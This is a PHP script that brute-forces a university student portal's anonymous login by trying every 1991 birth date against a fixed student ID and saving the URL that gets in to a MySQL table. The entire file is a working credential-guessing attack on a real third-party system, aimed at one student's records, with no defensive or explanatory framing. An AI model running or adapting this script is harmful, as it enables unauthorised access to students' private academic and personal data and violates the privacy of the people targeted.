<?php
set_time_limit(0);
include('simple_html_dom.php');
include 'ChromePhp.php';
$year=1991;
$month=1;
$date=1;
$bdate='1991-01-01';
$flag=0;
while($bdate!='1991-12-31') {
$url='http://websismit.manipal.edu/websis/control/createAnonSession?idValue=100911001&birthDate_i18n='.$bdate.'&birthDate='.$bdate;
$html = file_get_html($url);
foreach($html->find('span') as $element) {
	if($element->innertext=="Manipal Institute of Technology") {
		$html->clear();
		unset($html);
		break;
	}
	else {
		$html->clear();
		unset($html);
		echo "successful<br>";
		$con=mysqli_connect("localhost","root","","webscrap");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
$url=mysqli_real_escape_string($con, $url);
echo($url);
$sql="INSERT INTO urls (url) VALUES ('$url')";
if (!mysqli_query($con,$sql))
  {
  //die('Error: ' . mysqli_error($con));
  	echo 'errror!';
  }
echo "1 record added";
echo memory_get_usage();
mysqli_close($con);
		$flag=1;
		break;
		
	}
}
if($flag==1) {
break;
}

$date++;
if($date==32) {
	$date=1;
	$month++;
}
if($month==13) {
	$month=1;
	break;
}
$month=sprintf("%02s", $month);
$date=sprintf("%02s", $date);
$bdate=$year.'-'.$month.'-'.$date;

}
$year=1991;
$month=1;
$date=1;
$bdate='1990-01-01';
//}
?>